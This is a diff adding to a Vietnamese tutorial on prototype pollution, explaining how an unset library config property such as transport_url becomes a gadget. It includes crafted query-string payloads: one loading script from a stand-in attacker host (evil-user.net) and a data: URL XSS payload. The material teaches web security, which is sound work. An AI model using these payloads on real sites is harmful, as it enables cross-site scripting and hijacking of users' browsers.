@@ -92,6 +92,31 @@ Gadget là công cụ biến lỗ hổng prototype pollution thành một khai t
 - Được ứng dụng sử dụng một cách không an toàn, chẳng hạn truyền vào một sink mà không qua lọc hoặc kiểm tra.
 - Có thể bị kẻ tấn công kiểm soát thông qua prototype pollution, tức là đối tượng phải có khả năng kế thừa phiên bản độc hại của thuộc tính được thêm vào prototype bởi kẻ tấn công.
 
-Một thuộc tính không thể trở thành gadget nếu nó được định nghĩa trực tiếp trên đối tượng. Khi đó, phiên bản thuộc tính của đối tượng sẽ ưu tiên hơn phiên bản độc hại được thêm vào prototype. Các trang web bảo mật cao có thể thiết lập prototype của đối tượng là null, ngăn chặn việc kế thừa bất kỳ thuộc tính nào.
+Một thuộc tính không thể trở thành gadget nếu nó được định nghĩa trực tiếp trên đối tượng. Khi đó, phiên bản thuộc tính của đối tượng sẽ ưu tiên hơn phiên bản độc hại được thêm vào prototype. Các trang web bảo mật cao có thể thiết lập prototype của đối tượng là `null`, ngăn chặn việc kế thừa bất kỳ thuộc tính nào.
 
+### Ví dụ về công cụ tấn công prototype pollution
+Nhiều thư viện JavaScript chấp nhận một đối tượng mà nhà phát triển có thể sử dụng để thiết lập các tùy chọn cấu hình khác nhau. Mã thư viện kiểm tra xem nhà phát triển có thêm các thuộc tính cụ thể vào đối tượng này hay không, và nếu có, nó điều chỉnh cấu hình tương ứng. Nếu một thuộc tính đại diện cho một tùy chọn cụ thể không tồn tại, thư viện thường sử dụng tùy chọn mặc định được định nghĩa trước. Ví dụ đơn giản:
+```js
+let transport_url = config.transport_url || defaults.transport_url;
+```
+
+Bây giờ, giả sử mã thư viện sử dụng `transport_url` để thêm một tham chiếu script vào trang:
+```js
+let script = document.createElement('script');
+script.src = `${transport_url}/example.js`;
+document.body.appendChild(script);
+```
+Nếu các nhà phát triển trang web không thiết lập thuộc tính `transport_url` trên đối tượng `config`, đây là một công cụ tiềm năng. Trong trường hợp kẻ tấn công có thể gây ô nhiễm `Object.prototype` toàn cục với thuộc tính `transport_url` của riêng họ, thuộc tính này sẽ được thừa kế bởi đối tượng `config` và được đặt làm giá trị `src` của script, trỏ đến một domain do kẻ tấn công kiểm soát.
+
+Nếu prototype có thể bị ô nhiễm thông qua một tham số truy vấn, chẳng hạn, kẻ tấn công chỉ cần lừa nạn nhân truy cập vào một URL được chế tạo đặc biệt để trình duyệt của họ tải một file JavaScript độc hại từ domain của kẻ tấn công:
+
+```js
+https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
+```
+Bằng cách cung cấp một URL dạng `data:`, kẻ tấn công cũng có thể nhúng trực tiếp payload XSS vào chuỗi truy vấn như sau:
+
+```
+https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
+```
+Lưu ý rằng phần `//` ở cuối ví dụ trên chỉ dùng để comment suffix `/example.js` đã được mã hóa sẵn.
 
